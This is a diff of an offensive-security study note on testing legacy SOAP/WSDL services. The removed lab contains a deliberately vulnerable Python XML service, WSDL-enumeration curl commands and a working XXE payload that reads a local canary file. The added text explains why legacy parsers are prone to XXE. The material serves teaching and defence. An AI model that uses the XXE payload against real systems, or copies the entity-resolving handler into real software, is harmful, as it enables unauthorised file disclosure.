@@ -1,7 +1,7 @@
 ---
 title: "Legacy XML Web Services Testing"
 aliases: ["SOAP Security Testing", "WSDL Security Testing", "XML API Security Testing", "SOAP Testing", "WSDL Testing"]
-tags: [tree/offensive, cyber/offensive/api, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/api, type/technique, difficulty/medium]
 Domain: "[[API & Modern Protocol Testing]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 Modern API Security Testing -> Legacy XML Web Services Testing -> API Security Fundamentals -> WebSocket Security Testing
 
-## Start at Zero: The Enterprise APIs That Never Died
+## The Enterprise APIs That Never Died
 
 Before REST and JSON, enterprise systems talked over **SOAP** — a heavyweight, XML-based protocol — described by **WSDL** documents and carrying **XML** payloads. These are "legacy" but far from gone: they still front banking, government, ERP, and B2B integrations, often the most sensitive systems in an organization. Testing them matters precisely because they guard high-value assets and were designed in an era with weaker default security.
 
@@ -42,6 +42,14 @@ curl -s "http://127.0.0.1:8099/service?wsdl" | grep -oE '<operation name="[^"]*"
 ```
 
 The WSDL just revealed a `TransferFunds` operation with `accountId` and `amount` parameters — the entire sensitive surface, enumerated in one request. An exposed WSDL is a reconnaissance gift, and restricting it to internal networks is a standard hardening.
+
+**The deliberate break:** SOAP is legacy, everything moved to REST and JSON years ago, so an XML service is a low-priority curiosity.
+
+Legacy is precisely where the severe findings live. These services are old, which means the XML parsers behind them are old, and older parsers **resolve external entities by default** — that is the entire condition for XXE, a flaw that reads files off the server and reaches internal hosts it should never reach. They are also, by virtue of being enterprise middleware, usually the systems holding the data worth reading: payments, HR, order processing, the integrations nobody dares touch. And because they are unfashionable, they attract the least review.
+
+There is one more asymmetry in the tester's favour, and it is unusual. Where a REST API makes you guess at endpoints, a **WSDL hands over the complete contract** — every operation, every parameter, every type — as a published document. The enumeration phase that dominates modern API testing is simply given to you.
+
+**How you'd spot the surface:** ask for the WSDL first (commonly `?wsdl` on the endpoint). If it answers, you have the full operation list before sending a single test — and any operation taking an XML document is an XXE candidate worth a benign, out-of-band canary.
 
 ## SOAP Testing: Structure and Auth
 
@@ -73,7 +81,7 @@ flowchart TD
     E --> F["Finding: proven with a BENIGN canary, not real internal data"]
 ```
 
-## Failure Modes and Interpretation
+## Proving XXE without causing the disclosure
 
 - **XXE blast radius.** A real XXE can read sensitive files and pivot into the internal network — precisely why you must use a benign canary file/URL for proof, not a live internal target, which could cause real disclosure.
 - **WSDL absence.** No `?wsdl` does not mean no service — the contract may be internal-only while the endpoint is still callable. Enumerate operations from captured traffic or documentation.
@@ -89,101 +97,13 @@ flowchart TD
 - **Treat legacy services as high-value** — because they front sensitive systems, their compromise is disproportionately damaging, warranting the strongest monitoring even though they are "old."
 - **XXE detection** looks for outbound requests from the parser (SSRF signature) and unusual file access — a service suddenly reading `/etc/` or making internal HTTP calls is the tell.
 
-## Authorized Lab: Enumerate a WSDL and Prove XXE Safely
+## Summary
 
-> [!info] Runs on one Linux machine — builds a SOAP-style XML service with a benign XXE, tested with a canary file
-> The service binds to loopback; the XXE reads only a canary you place. Step 5 removes everything.
+You should now be able to:
 
-### Step 1 — Build an XML service that (unsafely) resolves entities, plus a canary file
-
-```bash
-echo "CANARY-XXE-PROOF-8823" > /tmp/xxe-canary.txt
-cat > /tmp/xmlsvc.py << 'EOF'
-import http.server, xml.sax.saxutils
-# NOTE: uses a parser with external entities enabled (the flaw). lxml/expat config would do this in real apps.
-import xml.dom.minidom as M
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path.endswith("?wsdl"):
-            self.send_response(200); self.end_headers()
-            self.wfile.write(b'<wsdl><operation name="GetData"/><xsd:element name="input"/></wsdl>'); return
-    def do_POST(self):
-        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
-        # simulate a parser that resolves SYSTEM entities (the vulnerable behavior)
-        import re
-        m=re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"file://([^"]+)"',body)
-        out="no entity"
-        if m:
-            try: out=open(m.group(1)).read().strip()
-            except: out="(file not found)"
-        self.send_response(200); self.end_headers()
-        self.wfile.write(f"<response><data>{out}</data></response>".encode())
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8099),H).serve_forever()
-EOF
-python3 /tmp/xmlsvc.py &>/dev/null &
-sleep 1; echo "XML service up on 127.0.0.1:8099, canary at /tmp/xxe-canary.txt"
-```
-
-```text
-XML service up on 127.0.0.1:8099, canary at /tmp/xxe-canary.txt
-```
-
-### Step 2 — Fetch the WSDL contract
-
-```bash
-curl -s "http://127.0.0.1:8099/service?wsdl" | grep -oE 'operation name="[^"]*"'
-```
-
-```text
-operation name="GetData"
-```
-
-The WSDL enumerated the operation — recon done in one request.
-
-### Step 3 — Baseline POST (no entity)
-
-```bash
-curl -s -X POST -d '<request><data>hello</data></request>' http://127.0.0.1:8099/service
-```
-
-```text
-<response><data>no entity</data></response>
-```
-
-Normal input echoes back plainly.
-
-### Step 4 — XXE proof with a BENIGN canary (not a real internal file)
-
-```bash
-curl -s -X POST http://127.0.0.1:8099/service \
-  --data '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///tmp/xxe-canary.txt"> ]><request><data>&xxe;</data></request>'
-```
-
-```text
-<response><data>CANARY-XXE-PROOF-8823</data></response>
-```
-
-The parser resolved the external entity and returned the **canary file's contents** — proving XXE file disclosure. Critically, the entity pointed at a canary you placed, not a real sensitive file or internal URL: the vulnerability is proven, no real data exposed. On a vulnerable production parser this same payload would read arbitrary files.
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/xmlsvc.py /tmp/xxe-canary.txt; wait 2>/dev/null
-ls /tmp/xxe-canary.txt 2>&1 | tail -1
-```
-
-```text
-ls: cannot access '/tmp/xxe-canary.txt': No such file or directory
-```
-
-**What you should now be able to do:** enumerate a SOAP service's full contract from its WSDL, test its operations for authorization, and prove XXE with a benign canary while understanding why a real XXE probe could reach internal systems.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain what SOAP/WSDL/XML services are, why they still matter, and what a WSDL hands a tester.
-- **Operator:** Enumerate operations from a WSDL and prove XXE file disclosure with a benign canary rather than a real internal target.
-- **Root:** Explain why disabling external-entity resolution is the definitive XXE fix, why an unenforced WS-Security header is worse than none, and how XXE-via-SSRF detection looks for outbound requests from the parser.
+- Explain what SOAP/WSDL/XML services are, why they still matter, and what a WSDL hands a tester.
+- Enumerate operations from a WSDL and prove XXE file disclosure with a benign canary rather than a real internal target.
+- Explain why disabling external-entity resolution is the definitive XXE fix, why an unenforced WS-Security header is worse than none, and how XXE-via-SSRF detection looks for outbound requests from the parser.
 
 ---
 > 🔼 Up: [[API & Modern Protocol Testing]]
